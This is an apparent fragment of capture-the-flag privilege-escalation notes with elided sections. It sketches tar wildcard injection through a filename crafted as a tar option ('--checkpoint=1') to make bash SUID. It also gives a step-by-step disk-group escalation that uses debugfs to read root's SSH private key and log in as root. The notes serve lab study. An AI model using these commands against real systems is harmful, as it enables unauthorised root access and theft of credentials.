...
# Grab Root Flag
-------------------------------
# ALTERNATE METHOD INSTEAD OF REVERSE SHELL
# Change SUID Bit for bash

# Create file (Preferably on TGT System)
nano shell.sh
...
# As before, create malicious tar filenames (this time with sh (shell))
echo "" > "--checkpoint=1"
...
```bash
# If your user is a member of the disk group, you can read any file on the filesystem

# Step 1: Check group membership
id
# Example Result:
# uid=1000(jack) gid=1000(jack) groups=1000(jack),6(disk)
# Look for: disk -> if present, proceed below

# Step 2: Find where the root filesystem is mounted
df -h
# Example Result:
# /dev/mapper/ubuntu--vg-ubuntu--lv   9.8G  5.6G  3.7G  61%  /
# Note the device path mounted on / -> that is your target

# Step 3: Use debugfs to access the filesystem and read sensitive files
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv

# Step 4: Read root's SSH private key
cat /root/.ssh/id_rsa
# Example Result:
# -----BEGIN OPENSSH PRIVATE KEY-----
# b3BlbnNzaC1rZXktdjEA...
# What to do next? Copy the key to Kali and SSH in as root:
chmod 600 id_rsa
